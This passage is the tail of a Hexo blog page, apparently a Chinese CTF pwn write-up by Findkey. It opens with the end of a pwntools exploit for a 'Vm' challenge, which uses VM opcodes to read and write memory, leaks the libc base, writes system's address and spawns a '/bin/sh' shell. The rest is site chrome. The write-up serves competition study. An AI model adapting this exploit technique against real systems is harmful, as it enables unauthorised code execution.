class="built_in">int</span>,val:<span class="built_in">int</span></span>):</span><br><span class="line">    op3(<span class="number">3</span>,idx,val)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_mem</span>(<span class="params">addr:<span class="built_in">int</span></span>):</span><br><span class="line">    set_reg(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">    set_reg(<span class="number">1</span>,addr)</span><br><span class="line">    set_reg(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    op0(<span class="number">0x33</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_mem</span>(<span class="params">addr:<span class="built_in">int</span></span>):</span><br><span class="line">    set_reg(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">    set_reg(<span class="number">1</span>,addr)</span><br><span class="line">    set_reg(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    op0(<span class="number">0x33</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">system_123</span>():</span><br><span class="line">    set_reg(<span class="number">0</span>, <span class="number">0x4050A0</span>)</span><br><span class="line">    op0(<span class="number">0x33</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_mem(<span class="number">0x405020</span>)</span><br><span class="line">read_mem(<span class="number">0x405028</span>)</span><br><span class="line">read_mem(<span class="number">0x4050A0</span>)</span><br><span class="line">system_123()</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(code)</span><br><span class="line">libc_base = u64(io.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.send(p64(system))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 羊城杯-PWN-部分WP</li>
+        <li><strong>Author:</strong> Findkey</li>
+        <li><strong>Created at
+                :</strong> 2025-10-13 13:15:08</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-04-02 23:09:23
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://find-key.github.io/2025/10/13/YCB-PWN-some-WP/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Write-Up/">#Write Up</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/11/24/ret2dl-runtime-resolve/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">ret2dl_runtime_resolve</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/07/21/proto/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">proto buf 学习笔记</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">羊城杯-PWN-部分WP</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Malloc"><span class="nav-text">Malloc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4"><span class="nav-text">保护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1"><span class="nav-text">沙箱</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="nav-text">逆向分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Stack-Over-Flow"><span class="nav-text">Stack_Over_Flow</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4-1"><span class="nav-text">保护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1-1"><span class="nav-text">沙箱</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-1"><span class="nav-text">逆向分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-1"><span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vm"><span class="nav-text">Vm</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4-2"><span class="nav-text">保护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1-2"><span class="nav-text">沙箱</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-2"><span class="nav-text">逆向分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-2"><span class="nav-text">EXP</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Findkey</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        12 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="Image viewer">
+	<button class="image-viewer-close" type="button" aria-label="Close">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="Prev">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="Close">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="Next">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
+</div>
+
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
+</script>
+
+
+
+
+	
+<script src="/js/build/main.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+
+	
+</body>
+
+</html>
